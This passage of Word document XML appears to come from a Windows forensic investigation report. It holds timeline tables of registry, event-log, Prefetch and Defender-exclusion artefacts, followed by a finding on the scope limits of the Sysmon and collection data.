              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Profile: last logoff</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson</w:t>
              <w:br/>
              <w:t>S-1-5-21-1841083384-974204330-411256071-1001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_ProfileList.csv#4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.reg_networkadapters</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"Timestamp": "2023-11-09 18:58:23.3861757", "BatchKeyPath": "ROOT\\ControlSet001\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\0001", "DriverDesc": "Intel(R) 82574L Gigabit Network Connection", "BatchValueName": "Multiple", "DriverDate": "6-12-2018", "DriverVersion": "12.17.10.8", "ProviderName": "Microsoft", "DeviceInstanceid": "PCI\\V</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_NetworkAdapters.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 19:00:26.938000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: known networks</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network: first connected [local time converted to UTC, ActiveTimeBias=480 min]</w:t>
              <w:br/>
              <w:t>Network Wired passerelle=88-9E-68-2C-5B-05 DNS=hsd1.md.comcast.net</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_KnownNetworks.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:45:39.658338</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: SCSI</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Disk: installed ; Disk: first installed</w:t>
              <w:br/>
              <w:t xml:space="preserve">Ven_Samsung Prod_PSSD_T7 serial=000000 Samsung PSSD T7 SCSI Disk Device </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_SCSI.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:45:49.033342</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: VolumeInfoCache</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Volume seen (VolumeInfoCache)</w:t>
              <w:br/>
              <w:t>DriveName=E: | VolumeLabel=SSD | DriveType=Fixed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_VolumeInfoCache.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 18:58:21.136176</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 6009 | EventLog</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27546</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:22:18.737962</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\RuntimeBroker.exe (WIN-ELL0II3NDSJ)</w:t>
              <w:br/>
              <w:t>System 1074 | User32 | A user initiated a system restart | Hostname: DESKTOP-KJ81A5A | Reason: Other (Unplanned) | Type: power off | Code: 0x0 | C:\Windows\System32\RuntimeBroker.exe (WIN-ELL0II3NDSJ)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27759</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:51:10.762839</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\Tools\sysmon-config.xml</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 16 | Microsoft-Windows-Sysmon | ServiceConfigurationChange | ConfigurationFileHash: SHA256=E771CA7BD01FDB1BA7014BEB86D74AC9B30D7080AE79B1B8D55419E46C525D24 | C:\Users\medmondson\Desktop\Tools\sysmon-config.xml</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18346</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:51:11.035506</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 4 | Microsoft-Windows-Sysmon | Sysmon service state changed | Sysmon Version 15.1 | Status: Started | Timestamp: 2023-11-10 10:51:11.027</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18347</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:21:49.347147</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>KAPE.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=34C8DA55 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#51</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\KAPE.EXE-34C8DA55.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:31:24.097276</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>GKAPE.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=820B4717 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#49</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\GKAPE.EXE-820B4717.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:52:49.247112</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Defender (exclusions)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>exclusion: regf_mtime</w:t>
              <w:br/>
              <w:t>type=Paths | value=C:\Payloads\</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/defender.exclusions.jsonl#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-002: Scope limitations: Sysmon telemetry only from 2023-11-10 10:51:11 UTC; Dissect partial; SIDR dirty database; 2026-10-19 copy artefacts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2023-11-10 10:51:10.762839 → 2023-11-10 12:29:39.825781</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(1) Sysmon was installed at 2023-11-10 10:51:10 UTC (EID 16 config C:\Users\medmondson\Desktop\Tools\sysmon-config.xml, SHA256 E771CA7B...5D24; EID 4 started 10:51:11): no Sysmon process/network telemetry before that time. A Sysmon EID 255 error (ID AnswerQuery, "Unknown query event type 12") at 2023-11-10 12:29:39 UTC indicates a DNS-query parsing error (single event). (2) Job 'dissect' status partial (Python traceback); job 'sidr' warning "database state is not clean" (Windows.edb replayed with esentutl /r). (3) Security log starts 2023-11-09 11:02:41; no 4688 process auditing analysis possible unless enabled (to be checked). No log-clear events (Security 1102 / System 104 absent). (4) Prefetch/LNK SourceCreated 2026-10-19 15:05 = copy to analysis VM, not evidence. (5) Collection: KAPE.EXE 2023-11-10 11:21:49, gkape.exe 11:23:44 and 12:31:24 UTC – activity after ~12:31 is collection.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Process lineage questions (ProcessGuid chain) rely on Sysmon, which covers the period from 10:51:11 UTC to collection. Absence of evidence before 10:51 in Sysmon is not evidence of absence; Prefetch/Amcache/ShimCache/BAM must cover earlier periods.</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10:51:10.762839</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\Tools\sysmon-config.xml</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 16 | Microsoft-Windows-Sysmon | ServiceConfigurationChange | ConfigurationFileHash: SHA256=E771CA7BD01FDB1BA7014BEB86D74AC9B30D7080AE79B1B8D55419E46C525D24 | C:\Users\medmondson\Desktop\Tools\sysmon-config.xml</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18346</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:51:11.035506</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 4 | Microsoft-Windows-Sysmon | Sysmon service state changed | Sysmon Version 15.1 | Status: Started | Timestamp: 2023-11-10 10:51:11.027</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18347</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:29:39.825781</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 255 | Microsoft-Windows-Sysmon</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23123</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:21:49.347147</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>KAPE.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=34C8DA55 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#51</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\KAPE.EXE-34C8DA55.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
